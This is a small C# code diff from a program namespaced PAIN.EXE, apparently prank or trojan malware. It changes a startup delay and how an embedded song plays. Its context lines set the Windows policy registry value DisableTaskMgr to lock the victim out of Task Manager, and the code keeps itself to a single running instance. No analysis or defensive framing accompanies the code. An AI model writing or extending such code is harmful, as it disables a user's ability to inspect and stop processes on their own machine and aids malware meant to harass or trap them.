@@ -97,7 +97,7 @@ namespace PAIN.EXE {
             RefreshReg(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System", "DisableTaskMgr", 1, RegistryValueKind.DWord);
             #endregion
             #region Check()
-            Thread.Sleep(new Random(new Random().Next(100, 999)).Next(0, 500));
+            Thread.Sleep(new Random().Next(0, 500));
             if (Process.GetProcessesByName("Pain").Length > 1)
                 Environment.Exit(0);
             #endregion
@@ -132,8 +132,7 @@ namespace PAIN.EXE {
                     soundPlayer.Dispose();
                 }
                 soundPlayer = new SoundPlayer(Resources.hava_nagila);
-                soundPlayer.PlayLooping();
-                Thread.Sleep(341000);
+                soundPlayer.Play();
             }
             #endregion
         }
